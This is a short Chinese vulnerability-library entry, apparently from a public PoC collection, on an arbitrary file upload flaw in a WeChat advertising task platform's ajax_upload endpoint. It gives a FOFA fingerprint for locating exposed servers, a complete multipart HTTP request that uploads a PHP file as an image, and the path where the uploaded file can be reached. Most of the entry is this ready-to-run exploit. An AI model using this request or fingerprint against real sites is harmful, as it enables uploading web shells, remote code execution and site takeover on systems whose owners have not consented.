---
fofa: "/tpl/Public/js/func.js"
source: "wy876 漏洞文库"
---

# 微信广告任务平台 ajax_upload存在任意文件上传漏洞

# 一、漏洞简介
微信广告任务平台ajax_upload存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

# 二、影响版本
+ 微信广告任务平台

# 三、资产测绘
+ fofa`"/tpl/Public/js/func.js"`
+ 特征


# 四、漏洞复现
```java
POST /index.php/Home/index/ajax_upload HTTP/1.1
Host: 
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCc7iBZFp1mvojsxn
Accept: */*
Origin: http://127.0.0.1
Referer: http://127.0.0.1/index.php/Home/Index/index.html
Cookie: think_language=zh-CN; BJYADMIN=2150gjbkj92r835kg2dn9u9i75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Safari/537.36

------WebKitFormBoundaryCc7iBZFp1mvojsxn
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundaryCc7iBZFp1mvojsxn--
```


```java
https://xxxx/Uploads/images/2024-09-27/66f626b7a5af8.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zhsn7ptr9pmr61nd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
